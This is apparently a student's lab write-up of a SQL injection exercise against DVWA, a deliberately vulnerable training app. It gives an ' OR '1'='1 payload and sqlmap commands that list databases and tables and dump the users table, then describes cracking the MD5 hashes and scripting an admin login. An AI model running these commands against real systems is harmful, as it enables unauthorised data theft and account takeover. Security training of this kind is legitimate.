# üíâ SQL Injection ‚Äì DVWA

## üîç Objective
Exploit SQL Injection vulnerability in DVWA to extract user credentials, crack them, and confirm successful login.

---

## üõ†Ô∏è Steps Taken

1. **Initial Testing**
   - Selected *SQL Injection* module in DVWA.
   - Input field vulnerable to `' OR '1'='1` payload.
   - Verified: Application returned all users ‚Üí SQL Injection confirmed.

2. **Exploitation with SQLMap**
   - Ran SQLMap on vulnerable parameter:
     ```bash
     sqlmap -u "http://<YOUR_LOCAL_IP>/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=<YOUR_PHPSESSID>; security=low" --dbs
     ```
   - Discovered database: **dvwa**

3. **Dumping Tables**
   ```bash
   sqlmap -u "http://<YOUR_LOCAL_IP>/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=<YOUR_PHPSESSID>; security=low" -D dvwa --tables
- Found tables: users, guestbook

4. **Dumping Users**
   ```bash
   sqlmap -u "http://<YOUR_LOCAL_IP>/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=xxxxx; security=low" -D dvwa -T users --dump
- Extracted usernames + password hashes

5. **Password Cracking**
- Cracked MD5 hashes using sqlmap‚Äôs default dictionary
- Example:
    - admin ‚Üí password

6. **Verification with Python**
- Created sqli_login.py
- Script:
    - Fetches CSRF user_token
    - Logs in with admin / password
    - Confirms success by checking dashboard page

## üì∏ Proof

- Screenshot: SQLMap database dump
- Screenshot: Cracked password
- Screenshot: Python script auto-login success

## ‚úÖ Result

- Successfully exploited SQL Injection:
    - Extracted sensitive data
    - Cracked hashes
    - Automated login ‚Üí Full access as admin
